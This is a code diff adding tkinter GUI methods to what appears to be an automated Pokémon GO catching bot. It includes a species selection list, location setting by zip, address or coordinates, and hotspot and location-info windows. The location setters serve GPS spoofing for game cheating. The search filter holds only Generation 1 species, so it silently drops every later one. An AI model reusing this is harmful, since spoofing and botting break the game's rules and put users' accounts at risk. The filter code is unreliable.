+                "257 - Blaziken", "258 - Mudkip", "259 - Marshtomp", "260 - Swampert", "261 - Poochyena",
+                "262 - Mightyena", "263 - Zigzagoon", "264 - Linoone", "265 - Wurmple", "266 - Silcoon",
+                "267 - Beautifly", "268 - Cascoon", "269 - Dustox", "270 - Lotad", "271 - Lombre",
+                "272 - Ludicolo", "273 - Seedot", "274 - Nuzleaf", "275 - Shiftry", "276 - Taillow",
+                "277 - Swellow", "278 - Wingull", "279 - Pelipper", "280 - Ralts", "281 - Kirlia",
+                "282 - Gardevoir", "283 - Surskit", "284 - Masquerain", "285 - Shroomish", "286 - Breloom",
+                "287 - Slakoth", "288 - Vigoroth", "289 - Slaking", "290 - Nincada", "291 - Ninjask",
+                "292 - Shedinja", "293 - Whismur", "294 - Loudred", "295 - Exploud", "296 - Makuhita",
+                "297 - Hariyama", "298 - Azurill", "299 - Nosepass", "300 - Skitty", "301 - Delcatty",
+                "302 - Sableye", "303 - Mawile", "304 - Aron", "305 - Lairon", "306 - Aggron",
+                "307 - Meditite", "308 - Medicham", "309 - Electrike", "310 - Manectric", "311 - Plusle",
+                "312 - Minun", "313 - Volbeat", "314 - Illumise", "315 - Roselia", "316 - Gulpin",
+                "317 - Swalot", "318 - Carvanha", "319 - Sharpedo", "320 - Wailmer", "321 - Wailord",
+                "322 - Numel", "323 - Camerupt", "324 - Torkoal", "325 - Spoink", "326 - Grumpig",
+                "327 - Spinda", "328 - Trapinch", "329 - Vibrava", "330 - Flygon", "331 - Cacnea",
+                "332 - Cacturne", "333 - Swablu", "334 - Altaria", "335 - Zangoose", "336 - Seviper",
+                "337 - Lunatone", "338 - Solrock", "339 - Barboach", "340 - Whiscash", "341 - Corphish",
+                "342 - Crawdaunt", "343 - Baltoy", "344 - Claydol", "345 - Lileep", "346 - Cradily",
+                "347 - Anorith", "348 - Armaldo", "349 - Feebas", "350 - Milotic", "351 - Castform",
+                "352 - Kecleon", "353 - Shuppet", "354 - Banette", "355 - Duskull", "356 - Dusclops",
+                "357 - Tropius", "358 - Chimecho", "359 - Absol", "360 - Wynaut", "361 - Snorunt",
+                "362 - Glalie", "363 - Spheal", "364 - Sealeo", "365 - Walrein", "366 - Clamperl",
+                "367 - Huntail", "368 - Gorebyss", "369 - Relicanth", "370 - Luvdisc", "371 - Bagon",
+                "372 - Shelgon", "373 - Salamence", "374 - Beldum", "375 - Metang", "376 - Metagross",
+                "377 - Regirock", "378 - Regice", "379 - Registeel", "380 - Latias", "381 - Latios",
+                "382 - Kyogre", "383 - Groudon", "384 - Rayquaza", "385 - Jirachi", "386 - Deoxys",
+                
+                # Generation 4 (Sinnoh)
+                "387 - Turtwig", "388 - Grotle", "389 - Torterra", "390 - Chimchar", "391 - Monferno",
+                "392 - Infernape", "393 - Piplup", "394 - Prinplup", "395 - Empoleon", "396 - Starly",
+                "397 - Staravia", "398 - Staraptor", "399 - Bidoof", "400 - Bibarel", "401 - Kricketot",
+                "402 - Kricketune", "403 - Shinx", "404 - Luxio", "405 - Luxray", "406 - Budew",
+                "407 - Roserade", "408 - Cranidos", "409 - Rampardos", "410 - Shieldon", "411 - Bastiodon",
+                "412 - Burmy", "413 - Wormadam", "414 - Mothim", "415 - Combee", "416 - Vespiquen",
+                "417 - Pachirisu", "418 - Buizel", "419 - Floatzel", "420 - Cherubi", "421 - Cherrim",
+                "422 - Shellos", "423 - Gastrodon", "424 - Ambipom", "425 - Drifloon", "426 - Drifblim",
+                "427 - Buneary", "428 - Lopunny", "429 - Mismagius", "430 - Honchkrow", "431 - Glameow",
+                "432 - Purugly", "433 - Chingling", "434 - Stunky", "435 - Skuntank", "436 - Bronzor",
+                "437 - Bronzong", "438 - Bonsly", "439 - Mime Jr.", "440 - Happiny", "441 - Chatot",
+                "442 - Spiritomb", "443 - Gible", "444 - Gabite", "445 - Garchomp", "446 - Munchlax",
+                "447 - Riolu", "448 - Lucario", "449 - Hippopotas", "450 - Hippowdon", "451 - Skorupi",
+                "452 - Drapion", "453 - Croagunk", "454 - Toxicroak", "455 - Carnivine", "456 - Finneon",
+                "457 - Lumineon", "458 - Mantyke", "459 - Snover", "460 - Abomasnow", "461 - Weavile",
+                "462 - Magnezone", "463 - Lickilicky", "464 - Rhyperior", "465 - Tangrowth", "466 - Electivire",
+                "467 - Magmortar", "468 - Togekiss", "469 - Yanmega", "470 - Leafeon", "471 - Glaceon",
+                "472 - Gliscor", "473 - Mamoswine", "474 - Porygon-Z", "475 - Gallade", "476 - Probopass",
+                "477 - Dusknoir", "478 - Froslass", "479 - Rotom", "480 - Uxie", "481 - Mesprit",
+                "482 - Azelf", "483 - Dialga", "484 - Palkia", "485 - Heatran", "486 - Regigigas",
+                "487 - Giratina", "488 - Cresselia", "489 - Phione", "490 - Manaphy", "491 - Darkrai",
+                "492 - Shaymin", "493 - Arceus",
+                
+                # Generation 5 (Unova)
+                "494 - Victini", "495 - Snivy", "496 - Servine", "497 - Serperior", "498 - Tepig",
+                "499 - Pignite", "500 - Emboar", "501 - Oshawott", "502 - Dewott", "503 - Samurott",
+                "504 - Patrat", "505 - Watchog", "506 - Lillipup", "507 - Herdier", "508 - Stoutland",
+                "509 - Purrloin", "510 - Liepard", "511 - Pansage", "512 - Simisage", "513 - Pansear",
+                "514 - Simisear", "515 - Panpour", "516 - Simipour", "517 - Munna", "518 - Musharna",
+                "519 - Pidove", "520 - Tranquill", "521 - Unfezant", "522 - Blitzle", "523 - Zebstrika",
+                "524 - Roggenrola", "525 - Boldore", "526 - Gigalith", "527 - Woobat", "528 - Swoobat",
+                "529 - Drilbur", "530 - Excadrill", "531 - Audino", "532 - Timburr", "533 - Gurdurr",
+                "534 - Conkeldurr", "535 - Tympole", "536 - Palpitoad", "537 - Seismitoad", "538 - Throh",
+                "539 - Sawk", "540 - Sewaddle", "541 - Swadloon", "542 - Leavanny", "543 - Venipede",
+                "544 - Whirlipede", "545 - Scolipede", "546 - Cottonee", "547 - Whimsicott", "548 - Petilil",
+                "549 - Lilligant", "550 - Basculin", "551 - Sandile", "552 - Krokorok", "553 - Krookodile",
+                "554 - Darumaka", "555 - Darmanitan", "556 - Maractus", "557 - Dwebble", "558 - Crustle",
+                "559 - Scraggy", "560 - Scrafty", "561 - Sigilyph", "562 - Yamask", "563 - Cofagrigus",
+                "564 - Tirtouga", "565 - Carracosta", "566 - Archen", "567 - Archeops", "568 - Trubbish",
+                "569 - Garbodor", "570 - Zorua", "571 - Zoroark", "572 - Minccino", "573 - Cinccino",
+                "574 - Gothita", "575 - Gothorita", "576 - Gothitelle", "577 - Solosis", "578 - Duosion",
+                "579 - Reuniclus", "580 - Ducklett", "581 - Swanna", "582 - Vanillite", "583 - Vanillish",
+                "584 - Vanilluxe", "585 - Deerling", "586 - Sawsbuck", "587 - Emolga", "588 - Karrablast",
+                "589 - Escavalier", "590 - Foongus", "591 - Amoonguss", "592 - Frillish", "593 - Jellicent",
+                "594 - Alomomola", "595 - Joltik", "596 - Galvantula", "597 - Ferroseed", "598 - Ferrothorn",
+                "599 - Klink", "600 - Klang", "601 - Klinklang", "602 - Tynamo", "603 - Eelektrik",
+                "604 - Eelektross", "605 - Elgyem", "606 - Beheeyem", "607 - Litwick", "608 - Lampent",
+                "609 - Chandelure", "610 - Axew", "611 - Fraxure", "612 - Haxorus", "613 - Cubchoo",
+                "614 - Beartic", "615 - Cryogonal", "616 - Shelmet", "617 - Accelgor", "618 - Stunfisk",
+                "619 - Mienfoo", "620 - Mienshao", "621 - Druddigon", "622 - Golett", "623 - Golurk",
+                "624 - Pawniard", "625 - Bisharp", "626 - Bouffalant", "627 - Rufflet", "628 - Braviary",
+                "629 - Vullaby", "630 - Mandibuzz", "631 - Heatmor", "632 - Durant", "633 - Deino",
+                "634 - Zweilous", "635 - Hydreigon", "636 - Larvesta", "637 - Volcarona", "638 - Cobalion",
+                "639 - Terrakion", "640 - Virizion", "641 - Tornadus", "642 - Thundurus", "643 - Reshiram",
+                "644 - Zekrom", "645 - Landorus", "646 - Kyurem", "647 - Keldeo", "648 - Meloetta",
+                "649 - Genesect",
+                
+                # Generation 6 (Kalos)
+                "650 - Chespin", "651 - Quilladin", "652 - Chesnaught", "653 - Fennekin", "654 - Braixen",
+                "655 - Delphox", "656 - Froakie", "657 - Frogadier", "658 - Greninja", "659 - Bunnelby",
+                "660 - Diggersby", "661 - Fletchling", "662 - Fletchinder", "663 - Talonflame", "664 - Scatterbug",
+                "665 - Spewpa", "666 - Vivillon", "667 - Litleo", "668 - Pyroar", "669 - Flabébé",
+                "670 - Floette", "671 - Florges", "672 - Skiddo", "673 - Gogoat", "674 - Pancham",
+                "675 - Pangoro", "676 - Furfrou", "677 - Espurr", "678 - Meowstic", "679 - Honedge",
+                "680 - Doublade", "681 - Aegislash", "682 - Spritzee", "683 - Aromatisse", "684 - Swirlix",
+                "685 - Slurpuff", "686 - Inkay", "687 - Malamar", "688 - Binacle", "689 - Barbaracle",
+                "690 - Skrelp", "691 - Dragalge", "692 - Clauncher", "693 - Clawitzer", "694 - Helioptile",
+                "695 - Heliolisk", "696 - Tyrunt", "697 - Tyrantrum", "698 - Amaura", "699 - Aurorus",
+                "700 - Sylveon", "701 - Hawlucha", "702 - Dedenne", "703 - Carbink", "704 - Goomy",
+                "705 - Sliggoo", "706 - Goodra", "707 - Klefki", "708 - Phantump", "709 - Trevenant",
+                "710 - Pumpkaboo", "711 - Gourgeist", "712 - Bergmite", "713 - Avalugg", "714 - Noibat",
+                "715 - Noivern", "716 - Xerneas", "717 - Yveltal", "718 - Zygarde", "719 - Diancie",
+                "720 - Hoopa", "721 - Volcanion",
+                
+                # Generation 7 (Alola)
+                "722 - Rowlet", "723 - Dartrix", "724 - Decidueye", "725 - Litten", "726 - Torracat",
+                "727 - Incineroar", "728 - Popplio", "729 - Brionne", "730 - Primarina", "731 - Pikipek",
+                "732 - Trumbeak", "733 - Toucannon", "734 - Yungoos", "735 - Gumshoos", "736 - Grubbin",
+                "737 - Charjabug", "738 - Vikavolt", "739 - Crabrawler", "740 - Crabominable", "741 - Oricorio",
+                "742 - Cutiefly", "743 - Ribombee", "744 - Rockruff", "745 - Lycanroc", "746 - Wishiwashi",
+                "747 - Mareanie", "748 - Toxapex", "749 - Mudbray", "750 - Mudsdale", "751 - Dewpider",
+                "752 - Araquanid", "753 - Fomantis", "754 - Lurantis", "755 - Morelull", "756 - Shiinotic",
+                "757 - Salandit", "758 - Salazzle", "759 - Stufful", "760 - Bewear", "761 - Bounsweet",
+                "762 - Steenee", "763 - Tsareena", "764 - Comfey", "765 - Oranguru", "766 - Passimian",
+                "767 - Wimpod", "768 - Golisopod", "769 - Sandygast", "770 - Palossand", "771 - Pyukumuku",
+                "772 - Type: Null", "773 - Silvally", "774 - Minior", "775 - Komala", "776 - Turtonator",
+                "777 - Togedemaru", "778 - Mimikyu", "779 - Bruxish", "780 - Drampa", "781 - Dhelmise",
+                "782 - Jangmo-o", "783 - Hakamo-o", "784 - Kommo-o", "785 - Tapu Koko", "786 - Tapu Lele",
+                "787 - Tapu Bulu", "788 - Tapu Fini", "789 - Cosmog", "790 - Cosmoem", "791 - Solgaleo",
+                "792 - Lunala", "793 - Nihilego", "794 - Buzzwole", "795 - Pheromosa", "796 - Xurkitree",
+                "797 - Celesteela", "798 - Kartana", "799 - Guzzlord", "800 - Necrozma", "801 - Magearna",
+                "802 - Marshadow", "803 - Poipole", "804 - Naganadel", "805 - Stakataka", "806 - Blacephalon",
+                "807 - Zeraora", "808 - Meltan", "809 - Melmetal",
+                
+                # Generation 8 (Galar)
+                "810 - Grookey", "811 - Thwackey", "812 - Rillaboom", "813 - Scorbunny", "814 - Raboot",
+                "815 - Cinderace", "816 - Sobble", "817 - Drizzile", "818 - Inteleon", "819 - Skwovet",
+                "820 - Greedent", "821 - Rookidee", "822 - Corvisquire", "823 - Corviknight", "824 - Blipbug",
+                "825 - Dottler", "826 - Orbeetle", "827 - Nickit", "828 - Thievul", "829 - Gossifleur",
+                "830 - Eldegoss", "831 - Wooloo", "832 - Dubwool", "833 - Chewtle", "834 - Drednaw",
+                "835 - Yamper", "836 - Boltund", "837 - Rolycoly", "838 - Carkol", "839 - Coalossal",
+                "840 - Applin", "841 - Flapple", "842 - Appletun", "843 - Silicobra", "844 - Sandaconda",
+                "845 - Cramorant", "846 - Arrokuda", "847 - Barraskewda", "848 - Toxel", "849 - Toxtricity",
+                "850 - Sizzlipede", "851 - Centiskorch", "852 - Clobbopus", "853 - Grapploct", "854 - Sinistea",
+                "855 - Polteageist", "856 - Hatenna", "857 - Hattrem", "858 - Hatterene", "859 - Impidimp",
+                "860 - Morgrem", "861 - Grimmsnarl", "862 - Obstagoon", "863 - Perrserker", "864 - Cursola",
+                "865 - Sirfetch'd", "866 - Mr. Rime", "867 - Runerigus", "868 - Milcery", "869 - Alcremie",
+                "870 - Falinks", "871 - Pincurchin", "872 - Snom", "873 - Frosmoth", "874 - Stonjourner",
+                "875 - Eiscue", "876 - Indeedee", "877 - Morpeko", "878 - Cufant", "879 - Copperajah",
+                "880 - Dracozolt", "881 - Arctozolt", "882 - Dracovish", "883 - Arctovish", "884 - Duraludon",
+                "885 - Dreepy", "886 - Drakloak", "887 - Dragapult", "888 - Zacian", "889 - Zamazenta",
+                "890 - Eternatus", "891 - Kubfu", "892 - Urshifu", "893 - Zarude", "894 - Regieleki",
+                "895 - Regidrago", "896 - Glastrier", "897 - Spectrier", "898 - Calyrex",
+                
+                # Generation 9 (Paldea)
+                "899 - Sprigatito", "900 - Floragato", "901 - Meowscarada", "902 - Fuecoco", "903 - Crocalor",
+                "904 - Skeledirge", "905 - Quaxly", "906 - Quaxwell", "907 - Quaquaval", "908 - Lechonk",
+                "909 - Oinkologne", "910 - Tarountula", "911 - Spidops", "912 - Nymble", "913 - Lokix",
+                "914 - Pawmi", "915 - Pawmo", "916 - Pawmot", "917 - Tandemaus", "918 - Maushold",
+                "919 - Fidough", "920 - Dachsbun", "921 - Smoliv", "922 - Dolliv", "923 - Arboliva",
+                "924 - Squawkabilly", "925 - Nacli", "926 - Naclstack", "927 - Garganacl", "928 - Charcadet",
+                "929 - Armarouge", "930 - Ceruledge", "931 - Tadbulb", "932 - Bellibolt", "933 - Wattrel",
+                "934 - Kilowattrel", "935 - Maschiff", "936 - Mabosstiff", "937 - Shroodle", "938 - Grafaiai",
+                "939 - Bramblin", "940 - Brambleghast", "941 - Toedscool", "942 - Toedscruel", "943 - Klawf",
+                "944 - Capsakid", "945 - Scovillain", "946 - Rellor", "947 - Rabsca", "948 - Flittle",
+                "949 - Espathra", "950 - Tinkatink", "951 - Tinkatuff", "952 - Tinkaton", "953 - Wiglett",
+                "954 - Wugtrio", "955 - Bombirdier", "956 - Finizen", "957 - Palafin", "958 - Varoom",
+                "959 - Revavroom", "960 - Cyclizar", "961 - Orthworm", "962 - Glimmet", "963 - Glimmora",
+                "964 - Greavard", "965 - Houndstone", "966 - Flamigo", "967 - Cetoddle", "968 - Cetitan",
+                "969 - Veluza", "970 - Dondozo", "971 - Tatsugiri", "972 - Annihilape", "973 - Clodsire",
+                "974 - Farigiraf", "975 - Dudunsparce", "976 - Kingambit", "977 - Great Tusk", "978 - Scream Tail",
+                "979 - Brute Bonnet", "980 - Flutter Mane", "981 - Slither Wing", "982 - Sandy Shocks", "983 - Iron Treads",
+                "984 - Iron Bundle", "985 - Iron Hands", "986 - Iron Jugulis", "987 - Iron Moth", "988 - Iron Thorns",
+                "989 - Frigibax", "990 - Arctibax", "991 - Baxcalibur", "992 - Gimmighoul", "993 - Gholdengo",
+                "994 - Wo-Chien", "995 - Chien-Pao", "996 - Ting-Lu", "997 - Chi-Yu", "998 - Roaring Moon",
+                "999 - Iron Valiant", "1000 - Koraidon", "1001 - Miraidon", "1002 - Walking Wake", "1003 - Iron Leaves",
+                "1004 - Dipplin", "1005 - Poltchageist", "1006 - Sinistcha", "1007 - Okidogi", "1008 - Munkidori",
+                "1009 - Fezandipiti", "1010 - Ogerpon", "1011 - Archaludon", "1012 - Hydrapple", "1013 - Gouging Fire",
+                "1014 - Raging Bolt", "1015 - Iron Boulder", "1016 - Iron Crown", "1017 - Terapagos", "1018 - Pecharunt"
+            ]
+            
+            # Add all Pokemon to listbox
+            for pokemon in all_pokemon:
+                listbox.insert(tk.END, pokemon)
+                
+        except Exception as e:
+            print(f"Error loading Pokemon: {e}")
+    
+    def filter_pokemon_list(self, search_term, listbox):
+        """Filter Pokemon list based on search term"""
+        try:
+            # Clear current list
+            listbox.delete(0, tk.END)
+            
+            # Get all Pokemon
+            all_pokemon = [
+                # Generation 1 (Kanto)
+                "001 - Bulbasaur", "002 - Ivysaur", "003 - Venusaur", "004 - Charmander", "005 - Charmeleon",
+                "006 - Charizard", "007 - Squirtle", "008 - Wartortle", "009 - Blastoise", "010 - Caterpie",
+                "011 - Metapod", "012 - Butterfree", "013 - Weedle", "014 - Kakuna", "015 - Beedrill",
+                "016 - Pidgey", "017 - Pidgeotto", "018 - Pidgeot", "019 - Rattata", "020 - Raticate",
+                "021 - Spearow", "022 - Fearow", "023 - Ekans", "024 - Arbok", "025 - Pikachu",
+                "026 - Raichu", "027 - Sandshrew", "028 - Sandslash", "029 - Nidoran♀", "030 - Nidorina",
+                "031 - Nidoqueen", "032 - Nidoran♂", "033 - Nidorino", "034 - Nidoking", "035 - Clefairy",
+                "036 - Clefable", "037 - Vulpix", "038 - Ninetales", "039 - Jigglypuff", "040 - Wigglytuff",
+                "041 - Zubat", "042 - Golbat", "043 - Oddish", "044 - Gloom", "045 - Vileplume",
+                "046 - Paras", "047 - Parasect", "048 - Venonat", "049 - Venomoth", "050 - Diglett",
+                "051 - Dugtrio", "052 - Meowth", "053 - Persian", "054 - Psyduck", "055 - Golduck",
+                "056 - Mankey", "057 - Primeape", "058 - Growlithe", "059 - Arcanine", "060 - Poliwag",
+                "061 - Poliwhirl", "062 - Poliwrath", "063 - Abra", "064 - Kadabra", "065 - Alakazam",
+                "066 - Machop", "067 - Machoke", "068 - Machamp", "069 - Bellsprout", "070 - Weepinbell",
+                "071 - Victreebel", "072 - Tentacool", "073 - Tentacruel", "074 - Geodude", "075 - Graveler",
+                "076 - Golem", "077 - Ponyta", "078 - Rapidash", "079 - Slowpoke", "080 - Slowbro",
+                "081 - Magnemite", "082 - Magneton", "083 - Farfetch'd", "084 - Doduo", "085 - Dodrio",
+                "086 - Seel", "087 - Dewgong", "088 - Grimer", "089 - Muk", "090 - Shellder",
+                "091 - Cloyster", "092 - Gastly", "093 - Haunter", "094 - Gengar", "095 - Onix",
+                "096 - Drowzee", "097 - Hypno", "098 - Krabby", "099 - Kingler", "100 - Voltorb",
+                "101 - Electrode", "102 - Exeggcute", "103 - Exeggutor", "104 - Cubone", "105 - Marowak",
+                "106 - Hitmonlee", "107 - Hitmonchan", "108 - Lickitung", "109 - Koffing", "110 - Weezing",
+                "111 - Rhyhorn", "112 - Rhydon", "113 - Chansey", "114 - Tangela", "115 - Kangaskhan",
+                "116 - Horsea", "117 - Seadra", "118 - Goldeen", "119 - Seaking", "120 - Staryu",
+                "121 - Starmie", "122 - Mr. Mime", "123 - Scyther", "124 - Jynx", "125 - Electabuzz",
+                "126 - Magmar", "127 - Pinsir", "128 - Tauros", "129 - Magikarp", "130 - Gyarados",
+                "131 - Lapras", "132 - Ditto", "133 - Eevee", "134 - Vaporeon", "135 - Jolteon",
+                "136 - Flareon", "137 - Porygon", "138 - Omanyte", "139 - Omastar", "140 - Kabuto",
+                "141 - Kabutops", "142 - Aerodactyl", "143 - Snorlax", "144 - Articuno", "145 - Zapdos",
+                "146 - Moltres", "147 - Dratini", "148 - Dragonair", "149 - Dragonite", "150 - Mewtwo",
+                "151 - Mew"
+            ]
+            
+            # Filter Pokemon based on search term
+            if search_term:
+                filtered_pokemon = [p for p in all_pokemon if search_term.lower() in p.lower()]
+            else:
+                filtered_pokemon = all_pokemon
+            
+            # Add filtered Pokemon to listbox
+            for pokemon in filtered_pokemon:
+                listbox.insert(tk.END, pokemon)
+                
+        except Exception as e:
+            print(f"Error filtering Pokemon: {e}")
+    
+    def select_all_pokemon(self, listbox):
+        """Select all Pokemon in the list"""
+        try:
+            listbox.select_set(0, tk.END)
+        except Exception as e:
+            print(f"Error selecting all Pokemon: {e}")
+    
+    def select_none_pokemon(self, listbox):
+        """Deselect all Pokemon in the list"""
+        try:
+            listbox.selection_clear(0, tk.END)
+        except Exception as e:
+            print(f"Error deselecting Pokemon: {e}")
+    
+    def save_pokemon_selection(self, listbox, window):
+        """Save selected Pokemon and close window"""
+        try:
+            # Get selected Pokemon
+            selected_indices = listbox.curselection()
+            selected_pokemon = [listbox.get(i) for i in selected_indices]
+            
+            # Store selected Pokemon
+            self.selected_pokemon = set(selected_pokemon)
+            
+            # Update Pokemon bot with selection
+            if hasattr(self, 'pokemon_bot') and self.pokemon_bot:
+                self.pokemon_bot.set_target_pokemon(list(selected_pokemon))
+            
+            # Show confirmation
+            messagebox.showinfo("Pokemon Selection", 
+                              f"Selected {len(selected_pokemon)} Pokemon to catch!\n\n"
+                              f"Bot will only catch these Pokemon when running.")
+            
+            # Close window
+            window.destroy()
+            
+        except Exception as e:
+            messagebox.showerror("Error", f"Failed to save Pokemon selection: {e}")
+    
+    def set_location_by_zip(self):
+        """Set location using zip code"""
+        try:
+            if not self.pokemon_bot:
+                messagebox.showerror("Error", "Please login first!")
+                return
+            
+            zip_code = self.zip_code.get().strip()
+            if not zip_code:
+                messagebox.showerror("Error", "Please enter a zip code!")
+                return
+            
+            success = self.pokemon_bot.set_location_by_zip(zip_code)
+            if success:
+                self.update_location_display()
+                messagebox.showinfo("Success", f"Location set to zip code: {zip_code}")
+            else:
+                messagebox.showerror("Error", f"Could not find location for zip code: {zip_code}")
+                
+        except Exception as e:
+            messagebox.showerror("Error", f"Failed to set location by zip: {e}")
+    
+    def set_location_by_address(self):
+        """Set location using address"""
+        try:
+            if not self.pokemon_bot:
+                messagebox.showerror("Error", "Please login first!")
+                return
+            
+            address = self.address.get().strip()
+            if not address:
+                messagebox.showerror("Error", "Please enter an address!")
+                return
+            
+            success = self.pokemon_bot.set_location_by_address(address)
+            if success:
+                self.update_location_display()
+                messagebox.showinfo("Success", f"Location set to: {address}")
+            else:
+                messagebox.showerror("Error", f"Could not find location for address: {address}")
+                
+        except Exception as e:
+            messagebox.showerror("Error", f"Failed to set location by address: {e}")
+    
+    def set_location_by_coordinates(self):
+        """Set location using coordinates"""
+        try:
+            if not self.pokemon_bot:
+                messagebox.showerror("Error", "Please login first!")
+                return
+            
+            try:
+                lat = float(self.latitude.get().strip())
+                lng = float(self.longitude.get().strip())
+            except ValueError:
+                messagebox.showerror("Error", "Please enter valid coordinates!")
+                return
+            
+            success = self.pokemon_bot.set_location_by_coordinates(lat, lng)
+            if success:
+                self.update_location_display()
+                messagebox.showinfo("Success", f"Location set to: {lat}, {lng}")
+            else:
+                messagebox.showerror("Error", f"Could not find location for coordinates: {lat}, {lng}")
+                
+        except Exception as e:
+            messagebox.showerror("Error", f"Failed to set location by coordinates: {e}")
+    
+    def update_location_display(self):
+        """Update the location info display"""
+        try:
+            if not self.pokemon_bot:
+                return
+            
+            location = self.pokemon_bot.config['location']
+            
+            info_text = f"""📍 Current Location:
+Latitude: {location['lat']:.6f}
+Longitude: {location['lng']:.6f}
+Altitude: {location['alt']}m
+Address: {location['address']}
+City: {location['city']}
+State: {location['state']}
+Zip Code: {location['zip_code']}
+Country: {location['country']}"""
+            
+            self.location_info.delete(1.0, tk.END)
+            self.location_info.insert(1.0, info_text)
+            
+        except Exception as e:
+            self.logger.error(f"Error updating location display: {e}")
+    
+    def view_location_map(self):
+        """View location on map"""
+        try:
+            if not self.pokemon_bot:
+                messagebox.showerror("Error", "Please login first!")
+                return
+            
+            location = self.pokemon_bot.config['location']
+            lat = location['lat']
+            lng = location['lng']
+            
+            # Open map in browser
+            import webbrowser
+            map_url = f"https://www.google.com/maps?q={lat},{lng}"
+            webbrowser.open(map_url)
+            
+            self.update_status(f"🗺️ Opening map for location: {lat}, {lng}")
+            
+        except Exception as e:
+            messagebox.showerror("Error", f"Failed to open map: {e}")
+    
+    def find_pokemon_hotspots(self):
+        """Find Pokemon hotspots in the area"""
+        try:
+            if not self.pokemon_bot:
+                messagebox.showerror("Error", "Please login first!")
+                return
+            
+            hotspots = self.pokemon_bot.get_pokemon_hotspots(radius_km=10)
+            
+            if not hotspots:
+                messagebox.showinfo("No Hotspots", "No Pokemon hotspots found in the area.")
+                return
+            
+            # Create hotspots window
+            hotspots_window = tk.Toplevel(self.root)
+            hotspots_window.title("🔥 Pokemon Hotspots")
+            hotspots_window.geometry("600x400")
+            
+            # Create listbox for hotspots
+            hotspots_listbox = tk.Listbox(hotspots_window, height=15)
+            hotspots_listbox.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)
+            
+            # Add hotspots to list
+            for hotspot in hotspots:
+                hotspot_text = f"{hotspot['name']} - {hotspot['type'].title()} - {hotspot['distance']:.2f}km"
+                hotspots_listbox.insert(tk.END, hotspot_text)
+            
+            # Add scrollbar
+            scrollbar = ttk.Scrollbar(hotspots_window, orient="vertical", command=hotspots_listbox.yview)
+            hotspots_listbox.configure(yscrollcommand=scrollbar.set)
+            scrollbar.pack(side=tk.RIGHT, fill=tk.Y)
+            
+            self.update_status(f"🔥 Found {len(hotspots)} Pokemon hotspots in the area")
+            
+        except Exception as e:
+            messagebox.showerror("Error", f"Failed to find hotspots: {e}")
+    
+    def get_location_info(self):
+        """Get comprehensive location information"""
+        try:
+            if not self.pokemon_bot:
+                messagebox.showerror("Error", "Please login first!")
+                return
+            
+            location_info = self.pokemon_bot.get_location_info()
+            
+            if not location_info:
+                messagebox.showerror("Error", "Could not get location information!")
+                return
+            
+            # Create location info window
+            info_window = tk.Toplevel(self.root)
+            info_window.title("📍 Location Information")
+            info_window.geometry("700x500")
+            
+            # Create text widget for info
+            info_text = tk.Text(info_window, height=25, width=80)
+            info_text.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)
+            
+            # Format location info
+            info_display = f"""📍 LOCATION INFORMATION
+{'='*50}
+
+COORDINATES:
+  Latitude: {location_info['coordinates']['latitude']:.6f}
+  Longitude: {location_info['coordinates']['longitude']:.6f}
+  Altitude: {location_info['coordinates']['altitude']}m
+
+ADDRESS:
+  Full Address: {location_info['address']['full_address']}
+  City: {location_info['address']['city']}
+  State: {location_info['address']['state']}
+  Zip Code: {location_info['address']['zip_code']}
+  Country: {location_info['address']['country']}
+
+WEATHER:
+  Condition: {location_info['weather']['condition'].title()}
+  Temperature: {location_info['weather']['temperature']}°F
+  Humidity: {location_info['weather']['humidity']}%
+  Wind Speed: {location_info['weather']['wind_speed']} mph
+  Pokemon Boost: {', '.join(location_info['weather']['pokemon_boost']).title()}
+
+POKESTOPS:
+  Density: {location_info['pokestops']['density'].title()}
+  Count: {location_info['pokestops']['count']} in {location_info['pokestops']['radius_km']}km radius
+
+GYMS:
+  Density: {location_info['gyms']['density'].title()}
+  Count: {location_info['gyms']['count']} in {location_info['gyms']['radius_km']}km radius
+
+POKEMON SPAWNS:
+  Common: {', '.join(location_info['pokemon_spawns']['common_spawns'])}
+  Uncommon: {', '.join(location_info['pokemon_spawns']['uncommon_spawns'])}
+  Rare: {', '.join(location_info['pokemon_spawns']['rare_spawns'])}
+  Legendary: {', '.join(location_info['pokemon_spawns']['legendary_spawns'])}
+  Spawn Rate: {location_info['pokemon_spawns']['spawn_rate']:.2f}
+  Nest Species: {location_info['pokemon_spawns']['nest_species']}
+
+HOTSPOTS:
+"""
+            
+            for hotspot in location_info['hotspots']:
+                info_display += f"  • {hotspot['name']} ({hotspot['type']}) - {hotspot['distance']:.2f}km\n"
+            
+            info_text.insert(1.0, info_display)
+            info_text.config(state=tk.DISABLED)
+            
+            self.update_status("📍 Location information retrieved successfully")
+            
+        except Exception as e:
+            messagebox.showerror("Error", f"Failed to get location info: {e}")
     
     def create_vps_bot_controller_tab(self):
         """Create VPS Bot Controller tab for remote bot control"""
